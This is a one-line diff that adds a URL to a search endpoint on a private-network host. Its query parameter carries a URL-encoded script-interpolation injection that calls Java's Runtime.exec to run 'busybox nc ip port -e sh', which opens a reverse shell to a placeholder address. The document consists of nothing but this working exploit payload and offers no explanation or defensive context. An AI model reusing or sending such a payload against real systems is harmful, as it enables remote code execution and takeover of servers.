@@ -1,0 +1,2 @@
+http://192.168.241.150:8080/search?query=$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('busybox%20nc%20ip%20port%20-e%20sh')%7D
+
